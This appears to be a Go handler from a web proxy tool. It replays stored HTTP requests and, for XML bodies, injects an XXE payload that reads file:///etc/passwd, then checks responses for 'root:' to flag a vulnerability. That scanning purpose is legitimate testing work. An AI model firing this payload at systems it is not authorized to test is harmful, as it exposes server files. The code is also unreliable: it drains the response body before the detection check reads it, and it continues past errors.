package repeatReqHandlers

import (
	"Proxy/src/db"
	"Proxy/src/utils"
	"bufio"
	"fmt"
	"github.com/sirupsen/logrus"
	"io"
	"io/ioutil"
	"net/http"
	"regexp"
	"strconv"
	"strings"
)

func ExecRepReq(respWriter http.ResponseWriter, request *http.Request) {
	dbConn, err := db.CreateNewDatabaseConnection()
	if err != nil {
		logrus.Warn("Can't connect to database")
		logrus.Error(err)
	}

	defer dbConn.Close()

	info := request.URL.Query()["id"]
	if len(info) < 1 {
		_, _ = fmt.Fprintf(respWriter,
			"Set id param to query in URL to repeat request\nYou can see all requests on http://127.0.0.1\n")
		return
	}

	if len(info) > 1 {
		_, _ = fmt.Fprintf(respWriter, "WARN: only first id would be used\n")
	}

	id, err := strconv.Atoi(info[0])
	if err != nil {
		logrus.Error(err)
	}

	req := dbConn.GetReqById(id)

	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	vunSearch := false
	if strings.Contains(req.Request, "<?xml") {
		xmlRegExp := regexp.MustCompile(`<\?xml .*\?>`)
		xmlVer := xmlRegExp.FindString(req.Request)
		req.Request = xmlRegExp.ReplaceAllLiteralString(req.Request, xmlVer + "\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY " +
			">\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n")
		vunSearch = true
	}

	reqReader := bufio.NewReader(strings.NewReader(req.Request))
	buffer, err := http.ReadRequest(reqReader)
	if err != nil {
		logrus.Error(err)
	}

	httpReq, err := http.NewRequest(buffer.Method, req.Host, buffer.Body)
	if err != nil {
		logrus.Error(err)
	}

	utils.CopyHeaders(buffer.Header, httpReq.Header)

	resp, err := client.Do(httpReq)
	if err != nil {
		logrus.Error(err)
	}

	utils.CopyHeaders(resp.Header, respWriter.Header())
	respWriter.WriteHeader(resp.StatusCode)
	_, _ =io.Copy(respWriter, resp.Body)
	if vunSearch {
		textResp, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			logrus.Warn("Can't search for vulnerable")
		}
		if strings.Contains(string(textResp), "root:") {
			logrus.Warn(req.Host + "has vulnerable")
			_, _ = fmt.Fprintf(respWriter, "WARN: This request has vulnerable")
		}
	}

	_ = resp.Body.Close()

}
